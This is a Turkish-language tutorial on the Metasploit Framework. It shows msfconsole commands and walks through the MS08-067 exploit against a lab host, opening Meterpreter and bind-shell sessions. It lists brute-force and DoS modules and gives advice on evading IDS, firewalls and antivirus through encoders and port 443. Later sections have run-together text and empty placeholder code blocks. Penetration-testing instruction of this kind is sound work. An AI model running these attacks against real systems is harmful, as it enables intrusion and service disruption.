### Metasploit Framework kullanımı

Metasploit Framework güvenlik açıklarını bulmak ve bu açıklar doğrultusunda ne gibi sonuçların orataya çıkabileceğini göstermek için kullanılan açık kaynak kodlu güvenlik programıdır. Aynı zamanda bünyesinde anti-forensic ve atlatma teknikleri uygulamalarını da barındırır.

Metasploit 2003 yılında HD Moore tarafından Perl dili ile bir network oyunu olarak programlandı. Daha sonra Ruby dili ile baştan itibaren tekrar yazıldı. Güvenlik dünyasına sunulmasının ardından en çok göze çarpan özellik, herkes tarafından bilinen güvenlik açıkları için özel exploitler bulundurması olmuştur. Bununla beraber, güvenlik araştırmacıları için yeni güvenlik açıklarını bulmakta güçlü bir yazılım olarak kullanılmaktadır. 21 Ekim 2009 tarihinde Metasploit projesinin Rapid7 bünyesine katıldığı bildirildi.

* Oluşturduğu yapı ile güvenlik denetçilerine, IDS imza geliştirme ve istismar araştırmaları yapan uzmanlara, hackerlara faydalı bilgiler vermekte ve exploit geliştiricileri için bir çatı oluşturmaktadır.
* Metasploit bir toplum projesi Metasploit LLC tarafından
yönetilmekteydi.
* Rapid7 firmasına satıldıkdan sonra Pro ve Community surümleri ile devam etmektedir.
* Metasploit Framework (MSF), Windows işletim sistemleri de dahil olmak üzere, geniş bir yelpazede çalışır.
* Windows 2000/XP/2003, Linux, OpenBSD, FreeBSD ve Mac OS X işletim sistemlerini destekler.
* Metasploit hızla gelişen bir araçtır.
* Hergün, her saat yeni güvenlik açıkları keşfedilmekte ve
bunları sömüren kodlar yazılmaktadır.
* Yeni payload ,encoder, exploit, ve NOP hazırlandığında metasploiti update ederek kullanabilirsiniz.
* http://tr.wikipedia.org/wiki/Metasploit
* http://www.metasploit.com/

##### Metasploit başlatma

Şimdi ise Metasploit başlatalım ve ilk saldırımızı yapalım. Ama ilk önce yaptığımız hareketlerin Metasploit tarafından izlenebilmesi için PostgreSQL veritabanını çalıştıralım.

```ShellSession
root@kali:~# service postgresql start
```

Bu aşamadan sonra Metasploit servislerini çalıştırmak için hazır bulunmaktayız. Aşağıdaki komut verilerimizi tutmak için veritabanda _ms3_ adlı kullanıcıyı ekleyecek ve RPC adlı uzaktan prosedürü başlatacak.

```ShellSession
root@kali:~# service metasploit start
```

_Metasploit Framework_'ün kullanılabilmesi için birçok arayüz vardır. Her arayüzün kendisine ait güçlü ve zayıf yanları olmakla beraber, _MSF_ özelliklerinin çoğuna erişilebilen konsol arayüzü __msfconsole__ en çok tercih edilendir.

```ShellSession
root@kali:~# msfconsole
```

Birkaç dakika bekletebilir, çünkü modüller yüklenecek. Bittikten sonra aşağıdaki gibi güzel bir ASCII çalışması çıkacak, ve `msf > prompt

```ShellSession
     ,           , 
    /             \ 
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||

Large pentest? List, sort, group, tag and search your hosts and services

in Metasploit Pro -- type 'go_pro' to launch it now.
       =[ metasploit v4.8.2-2014010101 [core:4.8 api:1.0]
+ -- --=[ 1246 exploits - 678 auxiliary - 198 post
+ -- --=[ 324 payloads - 32 encoders - 8 nops

msf >
```

Dikkat ettiyseniz, Metasploit'e ait 1.246 exploit, 678 auxiliary vb var. Bu zamanla daha da artacak. Yeni exploit'ler gün geçtikçe ekleniyor, çünkü bu bir toplumsal bir projedir. 

__MSFCONSOLE Kullanmanın Yararları__ 

Msfconsole en çok tercih edilen ve MSF içeriklerinin hepsini bir araya toplayan bir arayüzdür.
* Konsol bazlıdır.
* Metasploit içeriklerinin çoğuna erişim sağlar.
* çoğu içeriğe sahiptir ve en stabil ortamdır.
* Tab tuşu kontrolü, komut tamamlama ve satır okuma özelliklerine sahiptir. 
* MSF dışı sistem komutlarını kullanma imkanı sağlar.

```ShellSession
msf > ping -c 1 192.168.2.1
[*] exec: ping -c 1 192.168.2.1

PING 192.168.2.2 (192.168.2.1) 56(84) bytes of data.
64 bytes from 192.168.2.2: icmp_seq=1 ttl=128 time=10.3 ms
```


__Yardım Alma__

Bazen komutlarla kafanız karıştığında `help [komut_ismi]` yada `?` işareti yazarak komutlar hakkında detaylı yardım alınabilir.

```ShellSession
msf > help route
Usage: route [add/remove/get/flush/print] subnet netmask [comm/sid]

Route traffic destined to a given subnet through a supplied session.
The default comm is Local...
```

__Tab Tuşu Tamamlama__

Linux işletim sistemlerinin en büyük özelliklerinden biri olan Tab tuşu ile komut tamamlama, _msfconsole_ ile kullanılabilir. Yazılan komutun durumuna göre _msfconsole_ olasılıkları gösterir.

```ShellSession
msf > use exploit/windows/smb/ms
use exploit/windows/smb/ms03_049_netapi
use exploit/windows/smb/ms04_007_killbill
use exploit/windows/smb/ms04_011_lsass
use exploit/windows/smb/ms04_031_netdde
use exploit/windows/smb/ms05_039_pnp
use exploit/windows/smb/ms06_025_rasmans_reg 
use exploit/windows/smb/ms06_025_rras
use exploit/windows/smb/ms06_040_netapi
use exploit/windows/smb/ms06_066_nwapi
use exploit/windows/smb/ms06_066_nwwks
use exploit/windows/smb/ms08_067_netapi
use exploit/windows/smb/msdns_zonename
msf > use exploit/windows/smb/ms08_067_netapi
```

__`set`komutu__

Çalışma esnasında kullanılan modüle ait özellikleri konfigüre etmek için “set” komutu kullanılır.

```ShellSession
msf auxiliary(ms09_001_write) > set RHOST 192.168.1.1 
RHOST => 192.168.1.1
msf auxiliary(ms09_001_write) > show options
Module options:
  Name  Current Setting   Required Description
  ----  ---------------   -------- -----------
  RHOST 192.168.1.1       yes       The target address
  RPORT 445               yes       Set the SMB service port
```

__Global Değişken Tanımlama__

Msfconsole kullanım esnasında, birçok kez hedefe ait bilgileri girmek yerine bir seferde global değişken belirleyerek sürekli olarak kullanıma sunulabilir. Bu şekilde, bir sonraki açılışta hedef bilgileriniz değişmeyecektir. Büyük harflerle yazılan seçeneklere (ör: LHOST) ait özellikleri belirlemek için `setg` komutu, iptal etmek için `unsetg` komutu kullanılabilir.

```ShellSession
msf > setg LHOST 192.168.1.101 
      LHOST => 192.168.1.101
msf > setg RHOSTS 192.168.1.0/24 
      RHOSTS => 192.168.1.0/24
msf > setg RHOST 192.168.1.136
      RHOST => 192.168.1.136
msf > save

Saved configuration to: /root/.msf3/config 
msf >
```

##### Metasploit Modüllerini bulma

Modül arama işlerinde ilk dostunuz tabii ki de Google olacaktır, ama Metasploit'in de kendine ait modül veritabanı vardır. http://www.rapid7.com/db/modules/. Arama yaparken uzun uzun Common Vulnerabilities  and Exposures olarak veya CVE, MS08-067 gibi kısa kodlarla da arama yapılabilir.

![](../resim/metasploit/1.png)

MS08-067 modülü için arama yaptık. Aşağıda ise tam ismi gösterilmiştir. Bu modül `exploit/windows/smb/ms08_067_netapi` dizininde bulunmaktadır.

![](../resim/metasploit/2.png)

Ama istersek Metasploit'in dahili arama motorundan da faydalanabiliriz. 

```ShellSession
msf > search ms08-067

Matching Modules
================
Name            Disclosure       Date Rank Description
----            --------------- ---- -----------
.../ms08_067_netapi 2008-10-28 00:00:00 UTC great Microsoft Server
```

Modül hakkında bilgi almak için `info [modul_ismi]`

```ShellSession
msf > info exploit/windows/smb/ms08_067_netapi
Name: Microsoft Server Service Relative Path Stack Corruption Module: exploit/windows/smb/ms08_067_netapi
Version: 0
Platform: Windows
Privileged: Yes
License: Metasploit Framework License (BSD)
Rank: Great
```

Aradığımız modülün bu olduğna emin olduktan sonra `use [modul_ismi]` ile kullanmaya başlayabiliriz. 

```ShellSession
msf > use windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) >
```

Kullanacağımız modülü seçtikten sonra komutu çalıştırabilmek için lazım olan bilgiyi görmek için `show options`

```ShellSession
msf exploit(ms08_067_netapi) > show options
Module options (exploit/windows/smb/ms08_067_netapi):
Name Current Setting Required Description 
---- --------------- -------- -----------
RHOST                yes The target address
RPORT   445          yes Set the SMB service port
SMBPIPE BROWSER      yes The pipe name to use (BROWSER, SRVSVC)

Exploit target:
    Id  Name
    --  ----
    0   Automatic Targeting
```

__Required__ sütününda __'yes'__ ile belirtilen seçeneklerin mutlaka belirtilmesi gerekir.
Bu ayarlar şöyle yapılı;
* __RHOST =__ hostname veya ip adresi yazılabilir
* __LHOST =__ saldırıyı yapan sistemin ip adresi

Firewall, IDS/IPS'leri atlatmak için 443. portu kullanmanız önerilir.

Modülün hedefindeki sistemleri görüntülemek için `show targets`

```ShellSession
msf exploit(ms08_067_netapi) > show targets 

Exploit targets:

   Id  Name
   --  ----
   0   Automatic Targeting
   1   Windows 2000 Universal
   2   Windows XP SP0/SP1 Universal
   3   Windows XP SP2 English (AlwaysOn NX)
   4   Windows XP SP2 English (NX)
   5   Windows XP SP3 English (AlwaysOn NX)
   --snip--
   67 Windows 2003 SP2 Spanish (NX)
```

##### Payloads

* Exploit sonrası çalışıp yetkisiz işlevi gerçekleştirecek içerik.
* Metasploit Frameworkde kullanılan üst düzey farklı işlevselliğe sahip payloadlar bulunmaktadır. Bunlardan bazıları;
    * Meterpreter
    * DLL Injection
    * Binary Upload
    * PassiveX
    * Download and Exec 
    * Adduser

`show payloads` komutu ile mevcut payload listesi sıralanabilir. 324 tane var, tabii ki zamanla bu sayı değişecek.

```ShellSession
msf exploit(ms08_067_netapi) > show payloads
```

şimdi is testimizi yapalım. 

```ShellSession
msf exploit(ms08_067_netapi) > set RHOST 192.168.20.10
msf exploit(ms08_067_netapi) > exploit

[*] Started reverse handler on 192.168.20.9:4444
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] Attempting to trigger the vulnerability...
[*] Sending stage (752128 bytes) to 192.168.20.10
[*] Meterpreter session 1 opened (192.168.20.9:4444 -> 192.168.20.10:1334) at
2015-08-31 07:37:05 -0400

meterpreter >
```

Gördüğünüz gibi, Meterpreter (meta-interpreter) oturumu ile bitiriyoruz. Metasploit'in eşsiz payload'ı. Command shell yaptığını hatda daha fazlasını yapabilmektedir.

Şimdilik oturumu kapatıyoruz

```ShellSession
meterpreter > exit
[*] Shutting down Meterpreter...
[*] Meterpreter session 1 closed.  Reason: User exit
msf  exploit(ms08_067_netapi) >
```


##### MSFCLI

Metasploit Framework'u ile çalışmak için diğer bir güçlü komut istemci aracı ise __Msfcli__. Maalesef, _msfcli_ sürümü eski olduğundan ve sonrasında geliştirilmeyeceği hakkında bir bilgi mesajı almaktayız. Tavsiye edilen onun yerine _msfconsole -r_ veya _msfconsole -x_ kullanmak.

![msfcli](../resim/metasploit/msfcli.png)

msfcli kullanılırken, değişkenleri atamak için '=' işareti kullanılmalıdır. 

```ShellSession
root@bt4:/pentest/exploits/framework3# ./msfcli windows/smb/ms08_067_netapi 
RHOST=192.168.1.115 PAYLOAD=windows/shell/bind_tcp E
[*] Please wait while we load the module tree...
[*] Started bind handler
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP Service Pack 2 - lang:English
[*] Selected Target: Windows XP SP2 English (NX)
[*] Triggering the vulnerability...
[*] Sending stage (474 bytes)
[*] Command shell session 1 opened (192.168.1.101:54659 -> 192.168.1.115:4444)
```

Kullanıdığınız modülün seçeneklerini görmek için satır sonuna `O` eklenmelidir.

```ShellSession
root@kali:~# msfcli windows/smb/ms08_067_netapi O [*] Please wait while we load the module tree...
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST                      yes       The target address
   RPORT    445               yes       Set the SMB service port
   SMBPIPE  BROWSER           yes       The pipe name to use (BROWSER, SRVSVC)
```

Çalışılan mödüle ait payloadları görmek amacıyla satır sonuna `P` eklenmelidir.

```ShellSession
root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 P [*] Please wait while we load the module tree...

Compatible payloads
===================

Name
---- 
generic/custom
generic/debug_trap generic/shell_bind_tcp
generic/shell_reverse_tcp generic/tight_loop
--snip--
```


##### Auxiliary Nedir?

Modüller için geliştirilmiş ek programcıklar, yardımcı araçlardır.

* Exploit öncesi bilgi toplamak, exploit sonrası hedef sistemde ilerlemek için kullanılır.

* Metasploit’de en fazla kullanılan bileşenlerden biri Aux modülleridir.

##### Msfgui

Metasploit 3.x ile birlikte gelen arayüzdür. Msfgui ile birlikte exploitler , payloadlar, auxiliaryler kullanılabilir.

* Msfgui başlatmak için Windows sistemlerde Programs| Metasploit 3 | Metasploit 3 GUI bağlantısı izlenerek erişim kurulabilir.

* Unix türevi sistemlerde msfgui’ye erişim için metasploit framework’un kurulu olduğu dizine gidilerek `msfgui` komutu ile metasploit arayüzü başlatılabilir ve `-h` parametresi ile seçenekler listelenebilir.






Encoder Nedir ?
Metasploit Encoder, istenilen payloadın içeriğini değiştirerek Saldırı Tespit ve Engelleme
Sistemleri (IDS/IPS), Güvenlik Duvarları (Firewall) ve Antivirüsler tarafından tanınmasını engeller/zorlaştırır.
• Metasploit Frameworkde 27+ encoder bulunuyor.

Nop Nedir ?
“Not Operation” , bellek yeri öğrenme amaçlı bellek dolduran bitler.
Genellikle saldırı tespit ve engelleme sistemlerini yanıltmak için kullanılır.


Metasploit Araçlarını Anlamak
Metasploit , birden fazla araç ile arayüz kullanımı sağlar.Bu
araçlar farklı şartlar ve durumlarda yüksek derecede
esneklik sağlar ;
• Tek bir kullanıcı, tek bir hedef sömürme
• Bir kullanıcının bir oturum sırasında birden çok hedefi,
• Toplu iş modunda yönetebilmesi
• Aynı anda birden fazla oturum açma
• Payload oturumlarını askıya alma ve yenileme
• Başka kullanıcılar ile Payload oturumlarını paylaşma
• Güvenlik denetimi yapan grubun aynı ağda veya farklı ağlarda iş birliği



Msfconsole
Metasploitkomutsatırıaracıdır.Unixsistemlerde
metasploit dizinine geçilerek “msfconsole” komutu yazılarak
başlatılır.
• Windowssistemlerdeisewebarayüzünden
“Console” seçilerek erişim kurulur.
• Msfconsole ile payloadlar, exploitler, encoderlar, NOP lar ve auxiliary modulleri kullanılabilir.
• Metasploitkomutsatırı(msfconsole)açılışındametasploit logosu gelir.

msfconsole, farklı türlerde eğlenceli bannerlara sahiptir.”banner” komutu ile diğer bannerler görüntülenebilir

Yardım seçeneklerinin görüntülenmesi (help)
• Bu temel komutların açıklamalarına bir göz atalım.
• En çok kullanılan temel komutlar, ilerleyen konularda uygulamalı olarak yer almaktadır.

Msfconsole | Temel Komutlar

Temel Komutlar ============== Komut Açıklama ------- -----------
? Yardım menüsü
backMevcut seçenekten bir adım geriye döner banner Metasploit açılış bannerlarını gösterir cdDizin atlamak için kullanılır
color Renk seçeneklerini ayarlar
connect Uzak bir sunucuya bağlantı kurar exit Konsoldan çıkışı sağlar
helpYardım menüsü
info Bir veya daha fazla modul hakkında bilgi verir

Komut Açıklama
------- -----------
irb İrb scripting modunu getirir
Jobs Yapılan işleri gösterir ve düzenler
kill alışan bir görevi öldürür.
Load Framework için eklenti yükler
Loadpath Belirtilen yoldan istenilen modulu/exploiti yükler makerc Başlangıçtan itibaren kullanılan komutları bir dosyaya yazar
quit Konsoldan çıkışı sağlar
route Oturumun trafik rotasını belirler
Save Etkin veriyi kayıteder, depolar

Komut Açıklama
------- -----------
Set Ayarların konfigure edilmesinde kullanılan atama komutu
setg Genel bir değer, değişken atar
show Belirtilen modülü veya tüm modülleri listeler
sleepVerilen zaman içinde uyku moduna geç, birşey yapma unload Framework için mevcut eklentiyi kaldırır
unset Atanan değeri kaldırır
unsetg Yapılan genel bir değeri, değişkeni kaldırır
use Modülü seçer
versionKonsol uygulamasının versiyonunu gösterir
search Modül ismi veya açıklamalarda arama yapar sessions Aktif oturumları gösterir ve oturum bilgisi verir

Aux Modülleri
Metasploit yardımcı modülleri

Bilgi Toplama Amaçlı Aux Modülleri
örnek Aux modülleri
– use auxiliary/scanner/ftp/ftp_login
– use auxiliary/scanner/http/brute_dirs
– use auxiliary/scanner/http/dir_scanner
– use auxiliary/scanner/http/jboss_vulnscan – use auxiliary/scanner/http/open_proxy
– use auxiliary/scanner/http/tomcat_enum

Msfconsole | Auxiliary | Port Scanning
Port tarama için arka planda nmap kullanır. Port tarama araçlarını görüntülemek için portscan araması yapılabilir.

Msfconsole | Auxiliary | Brute Force
Metasploit, exploit öncesi ve sonrası parola deneme saldırıları için bir çok protokolü ve uygulamayı destekleyen yardımcı araçlar barındırmaktadır.

Metasploit Aux DoS Modülleri
• Metasploit kullanarak DoS saldırısı gerçekleştirme/deneme çalışmaları
• örnek Aux modülleri
– use auxiliary/dos/tcp/synflood
– use auxiliary/dos/wifi/ssidlist_beacon – use auxiliary/dos/wifi/fakeap


```ShellSession
a
```

```ShellSession
a
```

```ShellSession
a
```
















